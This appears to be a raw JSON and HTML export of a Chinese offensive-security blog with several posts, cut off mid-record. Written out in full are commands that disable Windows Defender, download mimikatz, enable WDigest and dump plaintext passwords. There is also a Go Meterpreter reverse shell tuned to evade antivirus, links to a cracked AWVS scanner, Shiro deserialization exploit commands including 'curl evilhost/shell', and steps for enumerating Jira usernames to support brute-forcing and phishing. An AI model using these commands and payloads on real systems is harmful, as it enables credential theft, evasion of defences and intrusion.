&amp;quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender&amp;quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f\ngpupdate /force\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;下载mimikatz后解压缩。&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;powershell.exe -NoP -NonI -Exec Bypass -Command &amp;quot;&amp;amp; {Import-Module BitsTransfer; Start-BitsTransfer &#39;http://你的服务器/mimikatz_trunk.zip&#39; &amp;quot;%APPDATA%\\mimikatz_trunk.zip&amp;quot;}&amp;quot;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;修改注册表开启UseLogonCredential&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;等用户下次再登录的时候,可抓到明文密码&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;mimikatz.exe privilege::debug\nsekurlsa::logonpasswords exit\n&lt;/code&gt;&lt;/pre&gt;\n&lt;!-- more --&gt;\n&#34;,&#34;fileName&#34;:&#34;Windows-Server-2016-Get-Plaintext-Password&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;临时禁止Windows Defender&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;REG ADD &amp;quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender&amp;quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f\ngpupdate /force\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;下载mimikatz后解压缩。&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;powershell.exe -NoP -NonI -Exec Bypass -Command &amp;quot;&amp;amp; {Import-Module BitsTransfer; Start-BitsTransfer &#39;http://你的服务器/mimikatz_trunk.zip&#39; &amp;quot;%APPDATA%\\mimikatz_trunk.zip&amp;quot;}&amp;quot;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;修改注册表开启UseLogonCredential&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;等用户下次再登录的时候,可抓到明文密码&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;mimikatz.exe privilege::debug\nsekurlsa::logonpasswords exit\n&lt;/code&gt;&lt;/pre&gt;\n&#34;,&#34;title&#34;:&#34;Windows Server 2016抓取明文密码&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;tips&#34;,&#34;slug&#34;:&#34;8pBIONj51ua&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/8pBIONj51ua/&#34;},{&#34;name&#34;:&#34;Password&#34;,&#34;slug&#34;:&#34;drn7X5PUuvA&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/drn7X5PUuvA/&#34;},{&#34;name&#34;:&#34;mimikatz&#34;,&#34;slug&#34;:&#34;sl7MN2NzG7_&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/sl7MN2NzG7_/&#34;},{&#34;name&#34;:&#34;Windows Server&#34;,&#34;slug&#34;:&#34;7poyR5EYd49&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/7poyR5EYd49/&#34;},{&#34;name&#34;:2016,&#34;slug&#34;:&#34;P65KJ5JWm0u&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/P65KJ5JWm0u/&#34;},{&#34;name&#34;:&#34;Powershell&#34;,&#34;slug&#34;:&#34;l39gwbPzcUX&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/l39gwbPzcUX/&#34;}],&#34;date&#34;:&#34;2020-03-02 08:46:50&#34;,&#34;dateFormat&#34;:&#34;2020-03-02&#34;,&#34;feature&#34;:&#34;https://bacde.me/post-images/Windows-Server-2016-Get-Plaintext-Password.jpg&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Windows-Server-2016-Get-Plaintext-Password/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:33000,&#34;words&#34;:108,&#34;minutes&#34;:1},&#34;description&#34;:&#34;临时禁止Windows Defender\nREG ADD &amp;quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender&amp;quot; /v DisableAntiS...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;Golang实现的x86下的Meterpreter reverse tcp。地址：&lt;a href=\&#34;https://github.com/insightglacier/go_meterpreter\&#34;&gt;https://github.com/insightglacier/go_meterpreter&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;做静态免杀实验，代码修改自&lt;a href=\&#34;https://github.com/EgeBalci/EGESPLOIT\&#34;&gt;EGESPLOIT&lt;/a&gt; 这个开源项目。单独实现主要在于减小程序编译后体积。目前编译后的大小在1.2M左右。&lt;/p&gt;\n&lt;h2 id=\&#34;使用方法\&#34;&gt;使用方法&lt;/h2&gt;\n&lt;p&gt;修改go_meterpreter.go中125行代码 s := &amp;quot;http://192.168.121.131:8989&amp;quot; IP和端口修改为自己的地址。然后就可以go build了。&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;set GOARCH=386\ngo build -ldflags=&amp;quot;-H windowsgui -w&amp;quot;   \n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;注意上面参数中没有-s，因为实际测试，使用这种方式build后的程序免杀效果会好一些。如果直接go build，程序会有窗口，同时大小也在1.6M左右。&lt;/p&gt;\n&lt;p&gt;由于加入了这部分代码，运行后因为执行多次无用代码，需要等一会才可以看到上线。另外目前会出现连接两次msf的情况，但是只有一个连接会返回shell，目前没找到原因。&lt;/p&gt;\n&lt;h2 id=\&#34;免杀效果\&#34;&gt;免杀效果&lt;/h2&gt;\n&lt;p&gt;加入了Bypass AV的代码。&lt;/p&gt;\n&lt;p&gt;我在刚写好的时候上传到VT，查杀结果位8/62。VT上有超过70个引擎，62个应该是加入BypassAV代码起的作用。&lt;/p&gt;\n&lt;p&gt;今天最新经过编译查杀结果为20/70。由于现在杀毒都有云查杀，刚写的时候效果好，但是过几天就被被杀。这里具体可以结合一些其他方式来尝试绕过。&lt;/p&gt;\n&lt;p&gt;VT检测结果地址：&lt;a href=\&#34;https://www.virustotal.com/gui/file/f8ff4acac418e6cdc326d0139ba2bdb9fce32558985962cf8303fcc97b9e47fb/detection\&#34;&gt;https://www.virustotal.com/gui/file/f8ff4acac418e6cdc326d0139ba2bdb9fce32558985962cf8303fcc97b9e47fb/detection&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;在使用这个的过程中，Windows10中自带的杀毒软件会拦截。会被动态行为发现。这里仅是过静态查杀测试。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;!-- more --&gt;\n&#34;,&#34;fileName&#34;:&#34;golang-x86-meterpreter-reverse-tcp&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;Golang实现的x86下的Meterpreter reverse tcp。地址：&lt;a href=\&#34;https://github.com/insightglacier/go_meterpreter\&#34;&gt;https://github.com/insightglacier/go_meterpreter&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;做静态免杀实验，代码修改自&lt;a href=\&#34;https://github.com/EgeBalci/EGESPLOIT\&#34;&gt;EGESPLOIT&lt;/a&gt; 这个开源项目。单独实现主要在于减小程序编译后体积。目前编译后的大小在1.2M左右。&lt;/p&gt;\n&lt;h2 id=\&#34;使用方法\&#34;&gt;使用方法&lt;/h2&gt;\n&lt;p&gt;修改go_meterpreter.go中125行代码 s := &amp;quot;http://192.168.121.131:8989&amp;quot; IP和端口修改为自己的地址。然后就可以go build了。&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;set GOARCH=386\ngo build -ldflags=&amp;quot;-H windowsgui -w&amp;quot;   \n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;注意上面参数中没有-s，因为实际测试，使用这种方式build后的程序免杀效果会好一些。如果直接go build，程序会有窗口，同时大小也在1.6M左右。&lt;/p&gt;\n&lt;p&gt;由于加入了这部分代码，运行后因为执行多次无用代码，需要等一会才可以看到上线。另外目前会出现连接两次msf的情况，但是只有一个连接会返回shell，目前没找到原因。&lt;/p&gt;\n&lt;h2 id=\&#34;免杀效果\&#34;&gt;免杀效果&lt;/h2&gt;\n&lt;p&gt;加入了Bypass AV的代码。&lt;/p&gt;\n&lt;p&gt;我在刚写好的时候上传到VT，查杀结果位8/62。VT上有超过70个引擎，62个应该是加入BypassAV代码起的作用。&lt;/p&gt;\n&lt;p&gt;今天最新经过编译查杀结果为20/70。由于现在杀毒都有云查杀，刚写的时候效果好，但是过几天就被被杀。这里具体可以结合一些其他方式来尝试绕过。&lt;/p&gt;\n&lt;p&gt;VT检测结果地址：&lt;a href=\&#34;https://www.virustotal.com/gui/file/f8ff4acac418e6cdc326d0139ba2bdb9fce32558985962cf8303fcc97b9e47fb/detection\&#34;&gt;https://www.virustotal.com/gui/file/f8ff4acac418e6cdc326d0139ba2bdb9fce32558985962cf8303fcc97b9e47fb/detection&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;在使用这个的过程中，Windows10中自带的杀毒软件会拦截。会被动态行为发现。这里仅是过静态查杀测试。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;Golang实现的x86下的Meterpreter reverse tcp&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;bypass&#34;,&#34;slug&#34;:&#34;-CeSGG-a_cS&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/-CeSGG-a_cS/&#34;},{&#34;name&#34;:&#34;shell&#34;,&#34;slug&#34;:&#34;Ku8fCt-Pyst&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/Ku8fCt-Pyst/&#34;},{&#34;name&#34;:&#34;Tool&#34;,&#34;slug&#34;:&#34;G8-CImT42BP&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/G8-CImT42BP/&#34;},{&#34;name&#34;:&#34;golang&#34;,&#34;slug&#34;:&#34;vjkahZOBqLq&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/vjkahZOBqLq/&#34;},{&#34;name&#34;:&#34;meterpreter&#34;,&#34;slug&#34;:&#34;wLw0gNhoavv&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/wLw0gNhoavv/&#34;},{&#34;name&#34;:&#34;Metasploit&#34;,&#34;slug&#34;:&#34;fQu0mXahjdT&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/fQu0mXahjdT/&#34;},{&#34;name&#34;:&#34;Reverse&#34;,&#34;slug&#34;:&#34;IvPnH59_xk9&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/IvPnH59_xk9/&#34;}],&#34;date&#34;:&#34;2020-02-23 12:42:11&#34;,&#34;dateFormat&#34;:&#34;2020-02-23&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/golang-x86-meterpreter-reverse-tcp/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;2 min read&#34;,&#34;time&#34;:93000,&#34;words&#34;:411,&#34;minutes&#34;:2},&#34;description&#34;:&#34;Golang实现的x86下的Meterpreter reverse tcp。地址：https://github.com/insightglacier/go_meterpreter\n做静态免杀实验，代码修改自EGESPLOIT 这个开源项目。...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95\&#34;&gt;使用方法&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%85%8D%E6%9D%80%E6%95%88%E6%9E%9C\&#34;&gt;免杀效果&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;今天看到有群里分享Acunetix Web Vulnerability Scanner(AWVS)13的破解版本，这里分享一下～&lt;/p&gt;\n&lt;p&gt;Windows下载地址：&lt;br&gt;\n&lt;a href=\&#34;https://pan.baidu.com/s/10y_nGpe-rLHqRoyB4Hz3BQ\&#34; title=\&#34;百度盘下载地址\&#34;&gt;https://pan.baidu.com/s/10y_nGpe-rLHqRoyB4Hz3BQ&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;Linux 下载地址：&lt;br&gt;\n&lt;a href=\&#34;https://mega.nz/#!JAxkRQgB!RcaAd5-zHKTNQHD28YcAocKB4RVoNDrOZRnL5bCLj0g\&#34;&gt;https://mega.nz/#!JAxkRQgB!RcaAd5-zHKTNQHD28YcAocKB4RVoNDrOZRnL5bCLj0g&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;官网介绍地址&lt;br&gt;\n&lt;a href=\&#34;https://www.acunetix.com/vulnerability-scanner/\&#34;&gt;https://www.acunetix.com/vulnerability-scanner/&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;注：工具来源于网络，请自行验证是否存在后门等情况，为了安全考虑建议使用虚拟机运行。&lt;/strong&gt;&lt;/p&gt;\n&lt;!-- more --&gt;\n&#34;,&#34;fileName&#34;:&#34;Acunetix-Web-Vulnerability-Scanner-13-cracked&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;今天看到有群里分享Acunetix Web Vulnerability Scanner(AWVS)13的破解版本，这里分享一下～&lt;/p&gt;\n&lt;p&gt;Windows下载地址：&lt;br&gt;\n&lt;a href=\&#34;https://pan.baidu.com/s/10y_nGpe-rLHqRoyB4Hz3BQ\&#34; title=\&#34;百度盘下载地址\&#34;&gt;https://pan.baidu.com/s/10y_nGpe-rLHqRoyB4Hz3BQ&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;Linux 下载地址：&lt;br&gt;\n&lt;a href=\&#34;https://mega.nz/#!JAxkRQgB!RcaAd5-zHKTNQHD28YcAocKB4RVoNDrOZRnL5bCLj0g\&#34;&gt;https://mega.nz/#!JAxkRQgB!RcaAd5-zHKTNQHD28YcAocKB4RVoNDrOZRnL5bCLj0g&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;官网介绍地址&lt;br&gt;\n&lt;a href=\&#34;https://www.acunetix.com/vulnerability-scanner/\&#34;&gt;https://www.acunetix.com/vulnerability-scanner/&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;注：工具来源于网络，请自行验证是否存在后门等情况，为了安全考虑建议使用虚拟机运行。&lt;/strong&gt;&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;Acunetix Web Vulnerability Scanner（AWVS） 13 破解版&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;Tool&#34;,&#34;slug&#34;:&#34;G8-CImT42BP&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/G8-CImT42BP/&#34;},{&#34;name&#34;:&#34;awvs&#34;,&#34;slug&#34;:&#34;S79ipJEPCwX&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/S79ipJEPCwX/&#34;},{&#34;name&#34;:&#34;Acunetix Web Vulnerability Scanner&#34;,&#34;slug&#34;:&#34;z_7vg3YDcVw&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/z_7vg3YDcVw/&#34;}],&#34;date&#34;:&#34;2020-02-22 22:04:06&#34;,&#34;dateFormat&#34;:&#34;2020-02-22&#34;,&#34;feature&#34;:&#34;https://bacde.me/post-images/Acunetix-Web-Vulnerability-Scanner-13-cracked.png&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Acunetix-Web-Vulnerability-Scanner-13-cracked/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:24000,&#34;words&#34;:98,&#34;minutes&#34;:1},&#34;description&#34;:&#34;今天看到有群里分享Acunetix Web Vulnerability Scanner(AWVS)13的破解版本，这里分享一下～\nWindows下载地址：\nhttps://pan.baidu.com/s/10y_nGpe-rLHqRoyB4...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;Shiro_exploit用于检测与利用Apache Shiro反序列化漏洞脚本。可以帮助企业发现自身安全漏洞。&lt;/p&gt;\n&lt;p&gt;工具下载地址：&lt;a href=\&#34;https://github.com/insightglacier/Shiro_exploit\&#34;&gt;Shiro_Exploit&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;该脚本通过网络收集到的22个key，利用ysoserial工具中的URLDNS这个Gadget，并结合dnslog平台实现漏洞检测。漏洞利用则可以选择Gadget和参数，增强灵活性。&lt;/p&gt;\n&lt;h1 id=\&#34;环境\&#34;&gt;环境&lt;/h1&gt;\n&lt;p&gt;Python2.7&lt;/p&gt;\n&lt;p&gt;requests&lt;/p&gt;\n&lt;p&gt;Jdk 1.8&lt;/p&gt;\n&lt;h1 id=\&#34;使用说明\&#34;&gt;使用说明&lt;/h1&gt;\n&lt;pre&gt;&lt;code&gt;usage: shiro_exploit.py [-h] -u URL [-t TYPE] [-g GADGET] [-p PARAMS] [-k KEY]\n\nOPTIONS:\n-h, --help            show this help message and exit\n-u URL, --url URL     Target url.\n-t TYPE, --type TYPE  Check or Exploit. Check :1 , Exploit:2 , Find gadget:3\n-g GADGET, --gadget GADGET\n                        gadget\n-p PARAMS, --params PARAMS\n                        gadget params\n-k KEY, --key KEY     CipherKey\n\nExample: python shiro_exploit.py -u target\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;检测默认只需要使用-u参数即可。&lt;/p&gt;\n&lt;p&gt;检测可用gadget的方式可以运行&lt;/p&gt;\n&lt;p&gt;python shiro_exploit.py -u http://target/ -t 3 -p &amp;quot;ping -c 2 {dnshost}&amp;quot; -k &amp;quot;kPH+bIxk5D2deZiIxcaaaA==&amp;quot;&lt;/p&gt;\n&lt;p&gt;程序执行时会获取dnslog的域名替换  &lt;code&gt;{dnshost}&lt;/code&gt; 这个值。不需要进行修改。目前还没解决windows和linux系统通用性的问题。这里-p自己根据实际情况指定下吧。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1581746645561.png\&#34; alt=\&#34;检测可用gadget\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;利用的话，可以采用JRMP的方式。也可以根据检测出来的gadge来进行利用。&lt;/p&gt;\n&lt;p&gt;服务器：&lt;/p&gt;\n&lt;p&gt;java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &#39;curl evilhost/shell –o shell&#39;&lt;/p&gt;\n&lt;p&gt;本地：&lt;/p&gt;\n&lt;p&gt;python shiro_exploit.py -u http://target/ -t 2 -g JRMPClient -p &amp;quot;remote_host:1099&amp;quot; -k &amp;quot;kPH+bIxk5D2deZiIxcaaaA==&amp;quot;&lt;/p&gt;\n&lt;h1 id=\&#34;常见问题\&#34;&gt;常见问题&lt;/h1&gt;\n&lt;ol&gt;\n&lt;li&gt;运行时出现 No module named &#39;Crypto&#39;&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;运行如下命令：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;pip uninstall crypto pycryptodome\npip install pycryptodome\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;python安装目录下的\\Lib\\site-packages，将crypto文件夹的名字改成Crypto。&lt;/p&gt;\n&lt;p&gt;如有其它问题或建议欢迎提交至issue。&lt;/p&gt;\n&lt;p&gt;工具的思路可以看文章：&lt;/p&gt;\n&lt;p&gt;&lt;a href=\&#34;https://www.bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/\&#34; title=\&#34;Apache Shiro 反序列化漏洞实战\&#34;&gt;https://www.bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;注：请不要将该脚本用于非法用途，仅用于合法的，经过授权的渗透测试，公司内部安全检查与研究使用。由于使用工具带来的不良后果与本人无关。&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;Apache-Shiro-Deserialize-Vulnerability-Tool&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;Shiro_exploit用于检测与利用Apache Shiro反序列化漏洞脚本。可以帮助企业发现自身安全漏洞。&lt;/p&gt;\n&lt;p&gt;工具下载地址：&lt;a href=\&#34;https://github.com/insightglacier/Shiro_exploit\&#34;&gt;Shiro_Exploit&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;该脚本通过网络收集到的22个key，利用ysoserial工具中的URLDNS这个Gadget，并结合dnslog平台实现漏洞检测。漏洞利用则可以选择Gadget和参数，增强灵活性。&lt;/p&gt;\n&lt;h1 id=\&#34;环境\&#34;&gt;环境&lt;/h1&gt;\n&lt;p&gt;Python2.7&lt;/p&gt;\n&lt;p&gt;requests&lt;/p&gt;\n&lt;p&gt;Jdk 1.8&lt;/p&gt;\n&lt;h1 id=\&#34;使用说明\&#34;&gt;使用说明&lt;/h1&gt;\n&lt;pre&gt;&lt;code&gt;usage: shiro_exploit.py [-h] -u URL [-t TYPE] [-g GADGET] [-p PARAMS] [-k KEY]\n\nOPTIONS:\n-h, --help            show this help message and exit\n-u URL, --url URL     Target url.\n-t TYPE, --type TYPE  Check or Exploit. Check :1 , Exploit:2 , Find gadget:3\n-g GADGET, --gadget GADGET\n                        gadget\n-p PARAMS, --params PARAMS\n                        gadget params\n-k KEY, --key KEY     CipherKey\n\nExample: python shiro_exploit.py -u target\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;检测默认只需要使用-u参数即可。&lt;/p&gt;\n&lt;p&gt;检测可用gadget的方式可以运行&lt;/p&gt;\n&lt;p&gt;python shiro_exploit.py -u http://target/ -t 3 -p &amp;quot;ping -c 2 {dnshost}&amp;quot; -k &amp;quot;kPH+bIxk5D2deZiIxcaaaA==&amp;quot;&lt;/p&gt;\n&lt;p&gt;程序执行时会获取dnslog的域名替换  &lt;code&gt;{dnshost}&lt;/code&gt; 这个值。不需要进行修改。目前还没解决windows和linux系统通用性的问题。这里-p自己根据实际情况指定下吧。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;Apache Shiro 反序列化漏洞利用工具使用&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;Tool&#34;,&#34;slug&#34;:&#34;G8-CImT42BP&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/G8-CImT42BP/&#34;},{&#34;name&#34;:&#34;Vulnerability&#34;,&#34;slug&#34;:&#34;cC2YgdB4CiQ&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/cC2YgdB4CiQ/&#34;},{&#34;name&#34;:&#34;Shiro&#34;,&#34;slug&#34;:&#34;eqRiiWDFB5p&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/eqRiiWDFB5p/&#34;},{&#34;name&#34;:&#34;Deserialize&#34;,&#34;slug&#34;:&#34;FqNacaERlcr&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/FqNacaERlcr/&#34;},{&#34;name&#34;:&#34;Exploit&#34;,&#34;slug&#34;:&#34;bllpWtIboyS&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/bllpWtIboyS/&#34;}],&#34;date&#34;:&#34;2020-02-15 14:02:42&#34;,&#34;dateFormat&#34;:&#34;2020-02-15&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Apache-Shiro-Deserialize-Vulnerability-Tool/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;3 min read&#34;,&#34;time&#34;:125000,&#34;words&#34;:478,&#34;minutes&#34;:3},&#34;description&#34;:&#34;Shiro_exploit用于检测与利用Apache Shiro反序列化漏洞脚本。可以帮助企业发现自身安全漏洞。\n工具下载地址：Shiro_Exploit\n该脚本通过网络收集到的22个key，利用ysoserial工具中的URLDNS这个G...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%8E%AF%E5%A2%83\&#34;&gt;环境&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E\&#34;&gt;使用说明&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98\&#34;&gt;常见问题&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;一个很攻击门槛很低的漏洞。可结合其它漏洞配合来进行攻击。&lt;/p&gt;\n&lt;p&gt;首先来简单说一下这个漏洞，该漏洞就是在Jira 8.4.0以前的版本，攻击者可以在不经过授权的情况下访问/rest/api/latest/groupuserpicker这个路径来枚举用户。漏洞危害评级中危。&lt;/p&gt;\n&lt;p&gt;2020年2月3日在exploit-db上公布了该漏洞利用脚本。地址：&lt;br&gt;\n&lt;a href=\&#34;https://www.exploit-db.com/exploits/47990\&#34;&gt;Jira 8.3.4 - Information Disclosure (Username Enumeration)&lt;/a&gt; 。&lt;/p&gt;\n&lt;p&gt;其漏洞很简单，只需要访问 http://target/rest/api/latest/groupuserpicker?query=admin （target为目标jira系统地址）。如果返回的是json字符串就说明存在漏洞。如果返回&amp;quot;You are not authenticated. Authentication required to perform this operation.&amp;quot; 则说明不存在这个漏洞。&lt;/p&gt;\n&lt;p&gt;那漏洞应该如何利用呢？&lt;br&gt;\n1、通过字典方式，探测用户是否存在。&lt;br&gt;\n2、如果存在漏洞，那么一旦匹配到结果，则会返回json格式的字符串，其中包含来用户民、邮箱、和显示的名字信息。在实际测试中发现，请求的参数不一定是用户的全拼，例如我们输入c，也是可以返回相关结果的。我们可以改变query参数的值，从a至z遍历。这样就可以获取系统中的用户名列表。&lt;/p&gt;\n&lt;p&gt;通过以上获取信息后，可以进行后续的利用。比如爆破用户密码，邮箱密码，发送钓鱼邮件等等。具体根据实际场景和相关经验进行扩展。&lt;/p&gt;\n&lt;h1 id=\&#34;相关连接\&#34;&gt;相关连接&lt;/h1&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;&lt;a href=\&#34;https://www.exploit-db.com/exploits/47990\&#34;&gt;Jira 8.3.4 - Information Disclosure (Username Enumeration)&lt;/a&gt;&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;&lt;a href=\&#34;https://www.doyler.net/security-not-included/more-jira-enumeration\&#34;&gt;More Jira Enumeration (usernames) – CVE-2019-8449&lt;/a&gt;&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;&lt;a href=\&#34;https://jira.atlassian.com/browse/JRASERVER-69796\&#34;&gt;User enumeration through the groupuserpicker api resource - CVE-2019-8449&lt;/a&gt;&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;!-- more --&gt;\n&#34;,&#34;fileName&#34;:&#34;cve-2019-8449-jira-enum-usernames&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;一个很攻击门槛很低的漏洞。可结合其它漏洞配合来进行攻击。&lt;/p&gt;\n&lt;p&gt;首先来简单说一下这个漏洞，该漏洞就是在Jira 8.4.0以前的版本，攻击者可以在不经过授权的情况下访问/rest/api/latest/groupuserpicker这个路径来枚举用户。漏洞危害评级中危。&lt;/p&gt;\n&lt;p&gt;2020年2月3日在exploit-db上公布了该漏洞利用脚本。地址：&lt;br&gt;\n&lt;a href=\&#34;https://www.exploit-db.com/exploits/47990\&#34;&gt;Jira 8.3.4 - Information Disclosure (Username Enumeration)&lt;/a&gt; 。&lt;/p&gt;\n&lt;p&gt;其漏洞很简单，只需要访问 http://target/rest/api/latest/groupuserpicker?query=admin （target为目标jira系统地址）。如果返回的是json字符串就说明存在漏洞。如果返回&amp;quot;You are not authenticated. Authentication required to perform this operation.&amp;quot; 则说明不存在这个漏洞。&lt;/p&gt;\n&lt;p&gt;那漏洞应该如何利用呢？&lt;br&gt;\n1、通过字典方式，探测用户是否存在。&lt;br&gt;\n2、如果存在漏洞，那么一旦匹配到结果，则会返回json格式的字符串，其中包含来用户民、邮箱、和显示的名字信息。在实际测试中发现，请求的参数不一定是用户的全拼，例如我们输入c，也是可以返回相关结果的。我们可以改变query参数的值，从a至z遍历。这样就可以获取系统中的用户名列表。&lt;/p&gt;\n&lt;p&gt;通过以上获取信息后，可以进行后续的利用。比如爆破用户密码，邮箱密码，发送钓鱼邮件等等。具体根据实际场景和相关经验进行扩展。&lt;/p&gt;\n&lt;h1 id=\&#34;相关连接\&#34;&gt;相关连接&lt;/h1&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;&lt;a 